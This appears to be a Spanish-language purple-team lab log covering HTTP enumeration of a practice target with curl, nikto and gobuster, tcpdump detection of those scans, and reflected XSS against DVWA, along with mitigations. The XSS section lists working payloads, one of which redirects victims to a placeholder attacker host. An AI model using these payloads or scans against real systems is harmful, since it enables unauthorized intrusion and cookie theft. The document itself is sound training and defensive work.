# Día 4 — HTTP Enumeration

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application  
**Táctica:** Initial Access (TA0001)

## Red Team

### Comandos ejecutados
| Comando | Output |
|---|---|
| `curl -I http://<target>:8080` | Apache/2.4.25, PHPSESSID sin httponly, security=low expuesto |
| `curl http://<target>:8080/robots.txt` | `Disallow: /` — no revela rutas ocultas |
| `nikto -h http://<target>:8080` | 11 hallazgos — Apache EOL, directory listing, cookies inseguras |
| `gobuster dir -u http://<target>:8080 -w common.txt` | /config/, /docs/, /external/, php.ini accesible |
| `curl http://<target>:8080/php.ini` | `allow_url_include=on` — RFI habilitado |
| `gobuster dir -u http://<target> -w common.txt` | Solo Apache default page — sin directorios interesantes |

### Hallazgos críticos
- `php.ini` accesible públicamente — `allow_url_include=on` habilita Remote File Inclusion
- Apache 2.4.25 EOL — versión sin soporte desde años
- `/config/` con directory listing — credenciales DB potencialmente expuestas
- Sin headers de seguridad — X-Frame-Options, X-Content-Type-Options ausentes
- Cookie `security=low` visible en headers — expone configuración interna
- Nikto completó scan de 11 vulnerabilidades en 60 segundos

## Blue Team

### Detección
| Comando | Qué detectó |
|---|---|
| `sudo tcpdump -i enp0s3 -n src host <attacker> and not port 22 -w dia04_capture.pcap` | GET requests masivos de Nikto y Gobuster |
| `sudo tcpdump -r dia04_capture.pcap -n \| head -40` | Patrón Nikto identificable — mismo path múltiples extensiones |

### Evidencia
- Patrón Nikto inconfundible — mismo path con `.asp`, `.php`, `.jsp`, `.backup` en milisegundos
- String `pmgwffW6` de Nikto visible en cada request
- Gobuster genera patrón diferente — paths distintos, misma extensión
- Un IDS con firma de Nikto detectaría esto instantáneamente

## Purple Team Analysis

**Effectiveness Score: 65/100**

| Red Team | Blue Team |
|---|---|
| Nikto encontró 11 vulnerabilidades en 60 segundos | Patrón Nikto claramente visible en tcpdump |
| Gobuster descubrió php.ini y /config/ | GET requests masivos identificables por velocidad |
| php.ini expuso RFI habilitado | Sin alerta automática |

### Security Gaps
- `php.ini` accesible públicamente
- `allow_url_include=on` — RFI habilitado
- Apache 2.4.25 EOL — sin parches
- Sin headers de seguridad
- Sin WAF — Nikto y Gobuster corrieron sin bloqueo

### Lección
Nikto y Gobuster son herramientas ruidosas — sus patrones son muy reconocibles. Un atacante real usaría herramientas más lentas y silenciosas. La velocidad de estas herramientas es su mayor debilidad desde el punto de vista del Blue Team.

## DVWA — XSS Reflected (Low)

### Explotación
| Payload | Output |
|---|---|
| `<script>alert('XSS')</script>` | Popup XSS — vulnerabilidad confirmada |
| `<script>alert(document.cookie)</script>` | PHPSESSID + security=low expuestos |
| `<script>window.location='http://<attacker>'</script>` | Redirección maliciosa ejecutada |
| URL con `?name=<script>alert('XSS_via_URL')</script>` | Popup via URL — vector de ataque real |

### Mitigación
- Output encoding — `htmlspecialchars()` en PHP
- Content Security Policy header
- Flag HttpOnly en cookies
- CVSS: 6.1 Medium

## App MS Security
- Endpoint `/alerts` con 5 alertas mock — HTTP 200 funcionando
- React scaffold con Vite inicializado — app corriendo en localhost:5173
- CORS habilitado con flask-cors

## Wazuh
- Rule 19011: AutoAdminLogon — ya mitigado Día 3
- **Mitigación aplicada:** queue_size aumentado de 5000 a 16000
- Agente Wazuh reiniciado con nueva configuración
